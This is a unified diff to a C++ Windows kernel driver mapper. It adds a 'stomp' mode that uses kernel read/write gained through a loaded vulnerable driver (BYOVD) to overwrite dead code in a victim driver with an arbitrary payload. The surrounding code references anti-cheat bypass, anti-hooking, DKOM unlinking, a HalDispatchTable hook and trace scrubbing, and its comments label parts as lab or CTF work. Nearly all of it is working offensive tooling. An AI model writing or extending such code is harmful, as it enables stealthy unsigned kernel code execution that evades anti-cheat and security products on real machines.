@@ -11,6 +11,7 @@
 #include "mapper_antihook.hpp"
 #include "vehicle_hygiene.hpp"
 #include "loader_auth.hpp"
+#include "stomp.h"
 #include <Windows.h>
 #include <winternl.h>
 #include <fstream>
@@ -240,6 +241,10 @@ static bool g_acReplicaIoctl = false; // Betest: title-specific AC IOCTL sweep
 static bool g_acReplicaBypass = false; // Betest: full lab AC sweep (replica live-test)
 static bool g_driver2Realtime = false; // driver2/: hygiene + stealth + bypass stack (lab)
 static bool g_driver2HideSymlink = false; // default keep symlink so usermode can reopen device
+static bool g_stompMode = false;          // image-backed stomp (no pool ManualMap)
+static bool g_stompDryRun = false;
+static bool g_stompKeepVehicle = true;
+static wchar_t g_stompVictim[64] = {};
 
 struct AcPreflightReport {
     bool acUsermode = false;
@@ -1497,6 +1502,73 @@ static uint64_t KernelAlloc(KernelPrimitives& prim, uint64_t kernelBase,
     return result;
 }
 
+// Stomp needs only KernelPrimitives R/W — no pool map, cave, or HAL hook.
+static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const char* payloadPath)
+{
+    if (!g_stompVictim[0]) {
+        Log("[!] --stomp requires --victim <shortName>\n");
+        return 1;
+    }
+    std::wstring modName, dosName;
+    if (!stomp::LookupVictimDosName(g_stompVictim, modName, dosName)) {
+        Log("[!] stomp victim profile missing for %ls\n", g_stompVictim);
+        return 1;
+    }
+    stomp::VictimImage vic{};
+    if (!stomp::EnumerateVictim(modName, vic)) {
+        Log("[!] stomp EnumerateVictim failed %ls\n", modName.c_str());
+        return 2;
+    }
+    if (!stomp::AnalyzeDeadCode(vic)) {
+        Log("[!] stomp no xref-proofed dead code in %ls (dead_funcs=%zu)\n",
+            modName.c_str(), vic.dead_funcs.size());
+        return 2;
+    }
+    std::vector<uint8_t> payloadFile = ReadFileBin(payloadPath);
+    if (payloadFile.empty()) {
+        Log("Failed to read stomp payload %s\n", payloadPath);
+        return 1;
+    }
+    uint32_t sizeOfImage = stomp::PeSizeOfImage(payloadFile);
+    if (!sizeOfImage) {
+        Log("[!] stomp invalid payload PE\n");
+        return 2;
+    }
+    stomp::StompPlan plan{};
+    plan.victim_name = vic.name;
+    plan.victim_dos_name = dosName;
+    plan.victim_base = vic.loaded_base;
+    if (!stomp::PlanPlacement(vic, sizeOfImage, plan)) {
+        Log("[!] stomp PlanPlacement failed need SizeOfImage=0x%x dead=%zu\n",
+            sizeOfImage, vic.dead_funcs.size());
+        return 2;
+    }
+    Log("[*] STOMP plan: victim=%ls base=0x%llx dead=%zu text=0x%x "
+        "cluster_rva=0x%x need=0x%x thunk=0x%x dry=%d\n",
+        vic.name.c_str(), (unsigned long long)vic.loaded_base,
+        vic.dead_funcs.size(), vic.text_vsize,
+        plan.payload_rva, plan.payload_size, plan.thunk_rva, g_stompDryRun ? 1 : 0);
+    if (g_stompDryRun) return 0;
+
+    uint64_t pMmGsa = stomp::ResolveKernelExport(prim, kernelBase, "MmGetSystemRoutineAddress");
+    uint64_t pMmCopy = stomp::ResolveKernelExport(prim, kernelBase, "MmCopyVirtualMemory");
+    uint32_t sweepMask = 0;
+    if (!stomp::ApplyStomp(prim, vic, plan, kernelBase, pMmGsa, pMmCopy, sweepMask, payloadFile)) {
+        Log("[!] stomp ApplyStomp failed\n");
+        return 2;
+    }
+    if (!stomp::VerifyStomp(prim, plan, payloadFile, 64)) {
+        Log("[!] stomp verify failed\n");
+        return 2;
+    }
+    Log("[+] stomp ok: victim=%ls drvObj=0x%llx cluster=%08x thunk=%08x\n",
+        vic.name.c_str(), (unsigned long long)plan.victim_driver_object,
+        plan.payload_rva, plan.thunk_rva);
+    g_stompKeepVehicle = true;
+    SecureZeroMemory(payloadFile.data(), payloadFile.size());
+    return 0;
+}
+
 int main(int argc, char* argv[]) {
     setvbuf(stdout, nullptr, _IONBF, 0);
     setvbuf(stderr, nullptr, _IONBF, 0);
@@ -1798,6 +1870,19 @@ int main(int argc, char* argv[]) {
             g_acReplicaIoctl = true;
         } else if (strcmp(argv[i], "--ac-replica-bypass") == 0) {
             g_acReplicaBypass = true;
+        } else if (strcmp(argv[i], "--stomp") == 0) {
+            g_stompMode = true;
+            g_rwOnly = true;
+            g_driver2Realtime = false;
+        } else if (strcmp(argv[i], "--stomp-dry-run") == 0) {
+            g_stompDryRun = true;
+        } else if (strcmp(argv[i], "--victim") == 0 && i + 1 < argc) {
+            MultiByteToWideChar(CP_UTF8, 0, argv[++i], -1, g_stompVictim, 64);
+        } else if (strcmp(argv[i], "--mode") == 0 && i + 1 < argc) {
+            if (_stricmp(argv[++i], "stomp") == 0) {
+                g_stompMode = true;
+                g_rwOnly = true;
+            }
         } else if (strcmp(argv[i], "--driver2") == 0) {
             g_driver2Realtime = true;
         } else if (strcmp(argv[i], "--driver2-hide-symlink") == 0) {
@@ -2299,6 +2384,12 @@ int main(int argc, char* argv[]) {
             return 1;
         }
         Log("BYOVD smoke : MZ OK (kernel R/W verified)\n");
+    }
+
+    if (g_stompMode) {
+        int stompRc = ExecuteStompMode(prim, kernelBase, argv[1]);
+        if (stompRc != 0) return stompRc;
+        goto finish_map;
     }
 
     // HalDispatchTable+8 kernel VA
@@ -4658,13 +4749,16 @@ int main(int argc, char* argv[]) {
         }
     }
 
+finish_map:
     // CTF Task 48: Mapper stealth cleanup
     MapperStealthCleanup();
 
     // DKOM unlink moved earlier — runs before driver mutation kills NalDrv IOCTL
 
     // STEALTH: Unload NalDrv and scrub all traces
-    if (!g_noCleanup) UnloadByovdDriver();
+    if (g_stompMode && g_stompKeepVehicle && !g_stompDryRun)
+        Log("[*] stomp: BYOVD left loaded (reboot clears); skip vehicle unload\n");
+    else if (!g_noCleanup) UnloadByovdDriver();
     else Log("[*] BYOVD cleanup skipped (--no-cleanup)\n");
 
     // Close log handle BEFORE deleting so the file isn't locked
